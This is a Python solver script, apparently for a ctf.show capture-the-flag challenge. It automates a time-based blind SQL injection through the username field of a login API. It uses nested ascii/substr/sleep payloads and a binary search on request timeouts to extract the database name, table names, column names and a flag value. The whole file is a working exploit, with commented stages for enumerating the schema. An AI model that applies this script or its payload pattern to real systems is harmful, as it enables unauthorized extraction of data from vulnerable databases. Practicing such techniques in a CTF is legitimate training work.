# @Author:Kradress
import requests

url = "http://3a9c1e4a-a0c2-47c9-ac10-cc3e7645ea62.challenge.ctf.show/api/"
table_name = 'flag233333'
flag = 'flagass233'

result = ''

# 数据库名
# payload = "database()"
# 爆表名
# payload = "select group_concat(table_name) from information_schema.tables where table_schema=database()"
# 爆列名
# payload = f"select group_concat(column_name) from information_schema.columns where table_schema=database() and table_name='{table_name}'"
# 爆字段值
payload = f"select {flag} from {table_name}"

for i in range(1, 50):
    head = 32
    tail = 127

    while head < tail:

        # sleep(1)

        mid = (head + tail) >> 1  # 中间指针等于头尾指针相加的一半
        # print(mid)
        data = {
            'username': f"ctfshow' and if(ascii(substr(({payload}),{i},1))>{mid},sleep(3),1)#",
            'password': 0
        }
        try:
            r = requests.post(url, data, timeout=2.5)
            tail = mid
        except:
            head = mid + 1  # sleep导致超时

    if head != 32:
        result += chr(head)
        print(result)
    else:
        break
